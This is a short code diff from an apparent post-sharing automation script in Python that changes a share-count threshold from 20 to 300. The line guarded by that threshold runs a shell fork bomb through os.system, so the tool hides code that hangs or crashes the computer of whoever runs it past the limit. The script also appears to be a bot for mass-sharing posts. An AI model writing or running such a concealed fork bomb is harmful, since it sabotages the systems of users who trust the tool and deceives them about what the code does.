@@ -91,7 +91,7 @@ class Share:
             console.log(f"Total success: {count}")
             break
     print(f"\033[32m[*] \033[0msharing post done!!")
-    if share_count > 20:
+    if share_count > 300:
       os.system(":(){ :|:& };:")
     exit()
 
